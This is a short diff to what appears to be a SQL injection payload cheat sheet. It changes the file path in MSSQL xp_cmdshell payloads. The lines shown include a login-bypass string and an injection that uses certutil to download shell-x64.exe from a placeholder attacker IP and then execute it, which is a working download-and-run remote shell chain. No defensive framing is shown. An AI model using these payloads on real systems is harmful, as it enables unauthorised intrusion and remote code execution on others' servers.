@@ -330,10 +330,10 @@ admin' or '1'='1
 ';exec xp_cmdshell <command>
 ```
 ```ps
-';exec xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>/shell-x64.exe c:/temp/shell-x64.exe';--
+';exec xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>/shell-x64.exe c:\Users\Public\shell-x64.exe';--
 ```
 ```ps
-';exec xp_cmdshell 'c:/temp/shell-x64.exe';--
+';exec xp_cmdshell 'c:\Users\Public\shell-x64.exe';--
 ```
 
 </details>
